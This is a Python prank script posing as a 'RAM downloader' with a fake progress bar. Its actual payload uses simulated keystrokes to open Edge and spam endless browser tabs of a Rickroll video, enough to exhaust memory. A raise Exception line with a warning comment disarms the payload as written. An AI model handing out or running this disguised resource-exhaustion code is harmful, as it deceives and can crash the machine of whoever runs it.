import os
import sys
import time

def cls():
    os.system("cls" if os.name == "nt" else "clear")

from pynput.keyboard import Key, Controller
keyboard = Controller()

def updatePercent(total, done):
    barLength = 30
    percent = round(done / total * 100, 0)
    numEquals = int(percent / (100 / barLength))
    numSpaces = barLength - numEquals
    sys.stdout.write("\rDownloading RAM: [{}{}] {}%".format('=' * numEquals, ' ' * numSpaces, percent))
    sys.stdout.flush()

def openWindows():
    keyboard.press(Key.cmd)
    keyboard.press("r")
    keyboard.release(Key.cmd)
    keyboard.release("r")
    time.sleep(0.3)
    keyboard.type("msedge.exe")
    time.sleep(0.2)
    keyboard.press(Key.enter)
    keyboard.release(Key.enter)

def openTab():
    keyboard.type("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    keyboard.press(Key.ctrl)
    keyboard.press("t")
    time.sleep(0.01)
    keyboard.release(Key.ctrl)
    keyboard.release("t")

size = None
try:
    size = int(input("How much RAM would you like to add? Please answer in Megabytes (MB)\n> "))
except ValueError:
    cls()
    print("Error. Must enter a valid positive whole number.")
    sys.exit(1)

if size % 1 != 0:
    cls()
    print("Error. Must enter a valid positive whole number.")
    sys.exit(1)

cls()
raise Exception("DO NOT RUN THIS SCRIPT OR YOUR COMPUTER WILL CRASH!! (probably)") #DO NOT REMOVE THIS LINE OR YOU HAVE A RISK OF BREAKING YOUR COMPUTER
total = size * 1_000_000_000_000
done = 0
if os.name == "nt":
    openWindows()

while done < total + 1:
    updatePercent(total, done)
    for i in range(50):
        openTab()
    done += 1
    time.sleep(0.01)

print("/n")
os.system("pause")